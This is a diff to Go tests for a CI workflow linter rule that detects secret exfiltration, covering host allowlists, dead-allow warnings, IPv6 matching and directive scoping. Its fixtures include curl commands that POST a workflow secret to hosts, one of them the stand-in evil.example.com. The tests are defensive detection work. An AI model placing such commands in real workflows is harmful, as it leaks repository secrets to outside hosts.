@@ -1841,21 +1841,61 @@ func TestSecretExfiltration_AllowedHosts_SuffixWildcard(t *testing.T) {
 	}
 }
 
-func TestSecretExfiltration_AllowedHosts_DeadAllowWarning(t *testing.T) {
-	// allow includes a host that is never referenced in any network command.
+func TestSecretExfiltration_AllowedHosts_DeadAllowWarning_GlobalSuppressed(t *testing.T) {
+	// Global config entries are intentionally NOT flagged as dead-allow on a
+	// per-workflow basis: a shared global allowlist will naturally have
+	// entries that any single workflow does not use. Flagging them would
+	// produce noise across every workflow that doesn't happen to call the
+	// same hosts. See PR #477 review.
 	script := `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`
 	allowed := []string{"api.example.com", "unused.example.org"}
 
 	got := runSecretExfiltrationRuleWithAllowedHosts(script, allowed)
 
-	var deadWarnings []*LintingError
 	for _, e := range got {
+		if strings.Contains(e.Description, "did not match any network command destination") {
+			t.Errorf("global config dead-allow warning unexpected, got %q", e.Description)
+		}
+	}
+}
+
+func TestSecretExfiltration_AllowedHosts_DeadAllowWarning_DirectiveOnly(t *testing.T) {
+	// Per-workflow directive entries SHOULD still produce a dead-allow
+	// warning when unused — they are scoped to one workflow file so
+	// "unused here" maps directly to "remove from this file".
+	rule := NewSecretExfiltrationRule()
+	cfg := &Config{}
+	rule.UpdateConfig(cfg)
+
+	wf := &ast.Workflow{
+		BaseNode: &yaml.Node{
+			HeadComment: "# sisakulint:secret-exfiltration.allowed-hosts: api.example.com, unused.example.org",
+			Line:        1,
+			Column:      1,
+		},
+	}
+	_ = rule.VisitWorkflowPre(wf)
+
+	step := &ast.Step{
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`,
+				Pos:   &ast.Position{Line: 1, Col: 1},
+			},
+		},
+	}
+	job := &ast.Job{Steps: []*ast.Step{step}}
+	_ = rule.VisitJobPre(job)
+	_ = rule.VisitWorkflowPost(wf)
+
+	var deadWarnings []*LintingError
+	for _, e := range rule.Errors() {
 		if strings.Contains(e.Description, "did not match any network command destination") {
 			deadWarnings = append(deadWarnings, e)
 		}
 	}
 	if len(deadWarnings) != 1 {
-		t.Fatalf("expected exactly 1 dead-allow warning, got %d: %v", len(deadWarnings), got)
+		t.Fatalf("expected exactly 1 dead-allow warning for unused directive entry, got %d: %v", len(deadWarnings), rule.Errors())
 	}
 	if !strings.Contains(deadWarnings[0].Description, "unused.example.org") {
 		t.Errorf("dead-allow warning should reference unused.example.org, got %q", deadWarnings[0].Description)
@@ -1937,7 +1977,7 @@ func TestNormalizeAllowedHost(t *testing.T) {
 		{"api example.com", ""},
 	}
 	for _, tt := range tests {
-		got := normalizeAllowedHost(tt.input)
+		got, _ := normalizeAllowedHost(tt.input)
 		if got != tt.want {
 			t.Errorf("normalizeAllowedHost(%q) = %q, want %q", tt.input, got, tt.want)
 		}
@@ -1964,5 +2004,169 @@ func TestUserHostAllowlistMatch(t *testing.T) {
 		if ok != tt.wantHit || got != tt.want {
 			t.Errorf("userHostAllowlistMatch(%q) = (%q, %v), want (%q, %v)", tt.host, got, ok, tt.want, tt.wantHit)
 		}
+	}
+}
+
+// TestSecretExfiltration_AllowedHosts_DynamicDestinationSuppressesDeadAllow
+// covers the PR #477 review finding: when the workflow contains a network
+// command whose destination cannot be statically resolved (e.g. `$URL`),
+// dead-allow warnings for per-workflow directive entries are suppressed —
+// the entry may match the runtime value the analyzer cannot see.
+func TestSecretExfiltration_AllowedHosts_DynamicDestinationSuppressesDeadAllow(t *testing.T) {
+	rule := NewSecretExfiltrationRule()
+	rule.UpdateConfig(&Config{})
+
+	wf := &ast.Workflow{
+		BaseNode: &yaml.Node{
+			Kind:        yaml.DocumentNode,
+			HeadComment: "# sisakulint:secret-exfiltration.allowed-hosts: api.example.com",
+			Line:        1,
+			Column:      1,
+		},
+	}
+	_ = rule.VisitWorkflowPre(wf)
+
+	step := &ast.Step{
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `URL=$RESOLVED; curl -X POST "$URL" -d "token=${{ secrets.X }}"`,
+				Pos:   &ast.Position{Line: 1, Col: 1},
+			},
+		},
+	}
+	job := &ast.Job{Steps: []*ast.Step{step}}
+	_ = rule.VisitJobPre(job)
+	_ = rule.VisitWorkflowPost(wf)
+
+	for _, e := range rule.Errors() {
+		if strings.Contains(e.Description, "did not match any network command destination") {
+			t.Errorf("dead-allow warning should be suppressed when destination is dynamic, got %q", e.Description)
+		}
+	}
+}
+
+// TestSecretExfiltration_AllowedHosts_IPv6 verifies that IPv6 hosts can be
+// added to the allowlist using either the bracketed `[::1]` form or the
+// bare `::1` form, and that they match curl URLs written with brackets.
+func TestSecretExfiltration_AllowedHosts_IPv6(t *testing.T) {
+	cases := []struct {
+		name    string
+		entry   string
+		dest    string
+		matched bool
+	}{
+		{"bracketed entry matches bracketed url", "[::1]", "https://[::1]/foo", true},
+		{"bare entry matches bracketed url", "::1", "https://[::1]/foo", true},
+		{"different ipv6 does not match", "::1", "https://[2001:db8::1]/foo", false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			script := `curl -X POST ` + tc.dest + ` -d "token=${{ secrets.X }}"`
+			got := runSecretExfiltrationRuleWithAllowedHosts(script, []string{tc.entry})
+			// Filter out dead-allow / invalid-entry noise.
+			findings := 0
+			for _, e := range got {
+				d := e.Description
+				if strings.Contains(d, "did not match any network command destination") {
+					continue
+				}
+				if strings.Contains(d, "is invalid and was ignored") {
+					continue
+				}
+				findings++
+			}
+			want := 0
+			if !tc.matched {
+				want = 1
+			}
+			if findings != want {
+				t.Errorf("ipv6 allowlist %q vs %q: got %d findings, want %d (errors=%v)", tc.entry, tc.dest, findings, want, got)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_AllowedHosts_InvalidEntryWarning covers the PR #477
+// review finding: entries that fail normalization (scheme, port, embedded
+// wildcard, etc.) must surface as a diagnostic rather than being silently
+// dropped.
+func TestSecretExfiltration_AllowedHosts_InvalidEntryWarning(t *testing.T) {
+	invalidInputs := []string{
+		"https://api.example.com",
+		"api.example.com:443",
+		"api.example.*",
+		"foo bar",
+	}
+	script := `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`
+	got := runSecretExfiltrationRuleWithAllowedHosts(script, invalidInputs)
+	warnings := 0
+	for _, e := range got {
+		if strings.Contains(e.Description, "is invalid and was ignored") {
+			warnings++
+		}
+	}
+	if warnings != len(invalidInputs) {
+		t.Errorf("expected %d invalid-entry warnings, got %d: %v", len(invalidInputs), warnings, got)
+	}
+}
+
+// TestSecretExfiltration_AllowedHosts_DirectiveScopedToTopLevel locks in the
+// PR #477 review fix: an allowed-hosts directive attached to a deep yaml
+// node (e.g. a step's LineComment) must NOT be honored. Only directives at
+// the workflow file's top-level scope take effect, so reviewers can audit
+// the suppression surface from the file header.
+func TestSecretExfiltration_AllowedHosts_DirectiveScopedToTopLevel(t *testing.T) {
+	// Build a workflow whose root carries no directive but a deeply nested
+	// step comment carries one. The expected behavior is that the directive
+	// is ignored and the curl call to evil.example.com fires a finding.
+	rule := NewSecretExfiltrationRule()
+	rule.UpdateConfig(&Config{})
+
+	deepStepKey := &yaml.Node{Kind: yaml.ScalarNode, Value: "name", LineComment: "# sisakulint:secret-exfiltration.allowed-hosts: evil.example.com"}
+	deepStepVal := &yaml.Node{Kind: yaml.ScalarNode, Value: "Deep step"}
+	deepStepNode := &yaml.Node{Kind: yaml.MappingNode, Content: []*yaml.Node{deepStepKey, deepStepVal}}
+
+	root := &yaml.Node{
+		Kind: yaml.MappingNode,
+		Content: []*yaml.Node{
+			{Kind: yaml.ScalarNode, Value: "on"}, {Kind: yaml.ScalarNode, Value: "push"},
+			{Kind: yaml.ScalarNode, Value: "jobs"}, deepStepNode,
+		},
+		Line: 1, Column: 1,
+	}
+	doc := &yaml.Node{Kind: yaml.DocumentNode, Content: []*yaml.Node{root}}
+
+	wf := &ast.Workflow{BaseNode: doc}
+	_ = rule.VisitWorkflowPre(wf)
+
+	step := &ast.Step{
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `curl -X POST https://evil.example.com -d "token=${{ secrets.X }}"`,
+				Pos:   &ast.Position{Line: 1, Col: 1},
+			},
+		},
+	}
+	job := &ast.Job{Steps: []*ast.Step{step}}
+	_ = rule.VisitJobPre(job)
+	_ = rule.VisitWorkflowPost(wf)
+
+	foundExfiltration := false
+	for _, e := range rule.Errors() {
+		if strings.Contains(e.Description, "secret-exfiltration") || strings.Contains(e.Description, "exfiltration") || strings.Contains(e.Description, "secret_exfiltration") {
+			foundExfiltration = true
+		}
+	}
+	// A simpler signal: count any finding that isn't a meta-warning.
+	if !foundExfiltration {
+		for _, e := range rule.Errors() {
+			if !strings.Contains(e.Description, "did not match") && !strings.Contains(e.Description, "is invalid and was ignored") {
+				foundExfiltration = true
+				break
+			}
+		}
+	}
+	if !foundExfiltration {
+		t.Errorf("deep-node directive should NOT suppress the finding, but no exfiltration finding was emitted; errors=%v", rule.Errors())
 	}
 }
